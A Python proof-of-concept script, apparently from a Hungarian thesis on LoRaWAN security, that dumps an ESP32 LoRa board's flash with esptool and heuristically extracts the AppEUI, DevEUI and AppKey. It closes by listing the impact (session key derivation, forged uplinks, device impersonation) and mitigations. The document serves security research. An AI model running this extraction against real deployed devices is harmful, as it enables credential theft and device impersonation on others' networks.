#!/usr/bin/env python3
"""
PoC #1 — LoRaWAN Flash Dump Key Extraction
Diplomamunka: LoRaWAN Class A biztonsági elemzés

Támadási lánc: B — Data injection előkészítés
Lépés 1/4: Fizikai hozzáférés → AppKey kinyerés

Szükséges:
    pip install esptool
    
Futtatás:
    python3 poc1_flash_dump.py --port /dev/ttyUSB0
    python3 poc1_flash_dump.py --port /dev/ttyUSB0 --skip-dump  (ha már van flash_dump.bin)
"""

import argparse
import subprocess
import sys
import time
import os

BANNER = """
╔══════════════════════════════════════════════════════════╗
║   PoC #1 — LoRaWAN Flash Dump & Key Extraction          ║
║   Target: Heltec WiFi LoRa 32 V2 (ESP32-D0WDQ6)        ║
║   Attack: Physical access → AppKey compromise            ║
╚══════════════════════════════════════════════════════════╝
"""

# ─── Ismert LoRaWAN kulcs fejlécek (heurisztika) ─────────────────────────────
# Az ESP32 PROGMEM-ben a kulcsok általában egymás után tárolódnak:
# APPEUI (8B) + DEVEUI (8B) + APPKEY (16B)
# A keresés az APPKEY-re fókuszál (16 byte, legnagyobb entrópia)

def print_step(n, text):
    print(f"\n[{n}] {text}")
    print("─" * 55)

def print_ok(text):
    print(f"    [OK] {text}")

def print_fail(text):
    print(f"    [!!] {text}")

def print_info(text):
    print(f"    [..] {text}")


# ─── 1. lépés: Flash dump ────────────────────────────────────────────────────

def dump_flash(port: str, output: str, baud: int = 921600) -> bool:
    print_step(1, f"Flash dump: {port} → {output}")
    print_info(f"Baud: {baud}, Méret: 8MB (0x800000)")
    print_info("Várható idő: ~2 perc")

    t_start = time.time()
    try:
        result = subprocess.run(
            ["esptool", "--port", port, "--baud", str(baud),
             "read-flash", "0x0", "0x800000", output],
            capture_output=True, text=True
        )
        elapsed = time.time() - t_start

        if result.returncode != 0:
            print_fail("esptool hiba:")
            print(result.stderr)
            return False

        size = os.path.getsize(output)
        print_ok(f"Dump kész: {size:,} byte ({elapsed:.1f}s)")

        # Chip info kinyerése az esptool outputból
        for line in result.stdout.splitlines():
            if any(k in line for k in ["Chip type", "MAC", "Flash size"]):
                print_info(line.strip())

        return True

    except FileNotFoundError:
        print_fail("esptool nem található — telepítsd: pip install esptool")
        return False


# ─── 2. lépés: Kulcs keresés ─────────────────────────────────────────────────

def find_keys(dump_path: str) -> dict:
    print_step(2, "LoRaWAN kulcsok keresése a dump-ban")

    data = open(dump_path, "rb").read()
    print_info(f"Dump méret: {len(data):,} byte")

    results = {}

    # ── Entrópia alapú keresés ────────────────────────────────────────────────
    # Keresünk 16 byte hosszú, nem triviális (nem csupa 0x00/0xFF) blokkokat
    # a firmware területen (0x10000 – 0x200000), amelyek egymás közelében vannak.
    # A PROGMEM kulcsok tipikusan 8+8+16 byte egymás után.

    print_info("Firmware terület vizsgálata (0x10000 – 0x200000)...")

    candidates = []
    fw_start = 0x10000
    fw_end   = 0x200000

    i = fw_start
    while i < min(fw_end, len(data) - 16):
        block = data[i:i+16]
        zeros   = block.count(0x00)
        ones    = block.count(0xFF)
        unique  = len(set(block))

        # Jó kulcs jellemzői: változatos bájtok, nem csupa nulla/FF
        if zeros <= 4 and ones <= 4 and unique >= 6:
            candidates.append((i, block))
        i += 1

    print_info(f"Kulcs jelölt blokkok: {len(candidates)} db")

    # ── Csoportosítás: egymás közelében lévő blokkok = kulcspár ─────────────
    # APPEUI(8) + DEVEUI(8) + APPKEY(16) általában ~32 byte területen belül

    groups = []
    used = set()
    for idx, (pos, block) in enumerate(candidates):
        if idx in used:
            continue
        group = [(pos, block)]
        for jdx, (pos2, block2) in enumerate(candidates[idx+1:], idx+1):
            if jdx in used:
                continue
            if pos2 - pos <= 48:  # 48 byte-on belül
                group.append((pos2, block2))
                used.add(jdx)
        if len(group) >= 2:
            groups.append(group)
        used.add(idx)

    if groups:
        print_ok(f"Kulcscsoport jelöltek: {len(groups)} db")
        # Legjobb csoport: legtöbb tagja van
        best = max(groups, key=lambda g: len(g))
        base_pos = best[0][0]

        print_ok(f"Legvalószínűbb kulcsterület: 0x{base_pos:06x}")
        print()

        # APPEUI — első 8 byte
        appeui_pos  = best[0][0]
        appeui_data = data[appeui_pos:appeui_pos+8]
        results["APPEUI"] = (appeui_pos, appeui_data)

        # DEVEUI — következő 8 byte (lehet overlap-pel)
        if len(best) >= 2:
            deveui_pos  = best[1][0]
        else:
            deveui_pos  = appeui_pos + 8
        deveui_data = data[deveui_pos:deveui_pos+8]
        results["DEVEUI"] = (deveui_pos, deveui_data)

        # APPKEY — következő 16 byte
        appkey_pos  = deveui_pos + 8
        appkey_data = data[appkey_pos:appkey_pos+16]
        results["APPKEY"] = (appkey_pos, appkey_data)

    else:
        print_fail("Nem találtunk kulcscsoportot automatikusan.")
        print_info("Próbáld a --known-pattern kapcsolóval ha ismered a kulcs egy részét.")

    return results


# ─── 3. lépés: Raw dump a megtalált területről ───────────────────────────────

def dump_key_area(data: bytes, base_pos: int, size: int = 64):
    print_step(3, f"Raw dump a kulcsterületről (0x{base_pos:06x})")
    for i in range(0, size, 16):
        row = data[base_pos + i : base_pos + i + 16]
        if not row:
            break
        hex_str = ' '.join(f'{b:02x}' for b in row)
        asc_str = ''.join(chr(b) if 32 <= b < 127 else '.' for b in row)
        print(f"    {base_pos+i:06x}  {hex_str:<48}  {asc_str}")


# ─── 4. lépés: Eredmény összefoglalás ────────────────────────────────────────

def print_summary(results: dict, dump_path: str):
    print_step(4, "Eredmény összefoglalás")

    if not results:
        print_fail("Nem sikerült kulcsokat kinyerni.")
        print_info("Lehetséges okok:")
        print_info("  - A kulcsok csupa 0x00 (placeholder, nem valódi deployment)")
        print_info("  - Flash Encryption be van kapcsolva (ritka gyári eszközön)")
        print_info("  - Nem standard tárolási hely")
        return

    print()
    print("    ┌─────────────────────────────────────────────────────┐")
    print("    │           KINYERT LoRaWAN KULCSOK                   │")
    print("    ├─────────────────────────────────────────────────────┤")

    for name, (pos, key_bytes) in results.items():
        hex_val = key_bytes.hex().upper()
        print(f"    │  {name:<8} @ 0x{pos:06x}  {hex_val:<36} │")

    print("    └─────────────────────────────────────────────────────┘")
    print()
    print("    Impakt:")
    print("    - AppKey ismert → session key levezetés lehetséges")
    print("    - Session key → hamis uplink injektálás (B lánc)")
    print("    - DevEUI + AppKey → teljes eszköz megszemélyesítés")
    print()
    print("    Mitigáció:")
    print("    - ESP32 Flash Encryption bekapcsolása (eFuse)")
    print("    - ESP32 Secure Boot engedélyezése")
    print("    - Kulcsok NVS encrypted storage-ban tárolása")
    print()

    dump_size  = os.path.getsize(dump_path)
    print(f"    Dump fájl: {dump_path} ({dump_size:,} byte)")
    print(f"    Eszköz:    Heltec WiFi LoRa 32 V2 (ESP32-D0WDQ6)")
    print(f"    Védelem:   Secure Boot=OFF, Flash Encryption=OFF")


# ─── CLI ─────────────────────────────────────────────────────────────────────

def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="PoC #1 — LoRaWAN flash dump és kulcs kinyerés"
    )
    parser.add_argument("--port",      default="/dev/ttyUSB0",
                        help="Soros port (default: /dev/ttyUSB0)")
    parser.add_argument("--baud",      type=int, default=921600,
                        help="Baud rate (default: 921600)")
    parser.add_argument("--output",    default="flash_dump.bin",
                        help="Dump fájl neve (default: flash_dump.bin)")
    parser.add_argument("--skip-dump", action="store_true",
                        help="Meglévő dump.bin használata, nem csinál újat")
    args = parser.parse_args()

    # 1. Flash dump
    if not args.skip_dump:
        ok = dump_flash(args.port, args.output, args.baud)
        if not ok:
            sys.exit(1)
    else:
        if not os.path.exists(args.output):
            print_fail(f"Nem létezik: {args.output}")
            sys.exit(1)
        print_info(f"Meglévő dump használata: {args.output}")

    data = open(args.output, "rb").read()

    # 2. Kulcs keresés
    results = find_keys(args.output)

    # 3. Raw dump
    if results:
        base = min(pos for pos, _ in results.values())
        dump_key_area(data, max(0, base - 16))

    # 4. Összefoglalás
    print_summary(results, args.output)


if __name__ == "__main__":
    main()